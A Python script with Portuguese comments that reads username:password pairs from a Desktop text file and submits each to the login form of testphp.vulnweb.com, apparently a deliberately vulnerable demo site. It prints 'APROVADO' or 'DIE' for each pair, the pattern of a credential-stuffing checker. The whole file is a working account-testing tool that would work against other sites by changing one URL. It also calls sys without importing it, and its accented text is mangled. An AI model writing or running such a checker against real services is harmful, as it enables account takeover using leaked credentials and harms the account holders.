# -*- coding: iso-8859-1 -*-

import requests
import os


# Obt�m o caminho completo para o arquivo "usuarios.txt" na sua �rea de trabalho
usuarios_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'usuarios.txt')

# Verifica se o arquivo existe antes de abri-lo
if not os.path.exists(usuarios_path):
    print("O arquivo usuarios.txt n�o foi encontrado!")
    sys.exit()

# Loop para executar o c�digo enquanto houverem linhas para ler no arquivo de bloco de notas
usuarios_lista = []
with open(usuarios_path, 'r') as arquivo:
    usuarios_lista = arquivo.readlines()

for usuario_senha in usuarios_lista:
    # Separar usu�rio e senha pelo caractere ':'
    usuario, senha = usuario_senha.strip().split(':')

    # Dados para fazer a solicita��o POST para o formul�rio de login
    data = {
        'uname': usuario,
        'pass': senha
    }

    # Enviar a solicita��o POST para o formul�rio de login
    response = requests.post("http://testphp.vulnweb.com/userinfo.php", data=data)

            # Verificar se o login foi bem-sucedido
    if 'logout' in response.text:
        print(f'{usuario}:{senha} APROVADO')
    else:
        print(f'{usuario}:{senha} DIE')
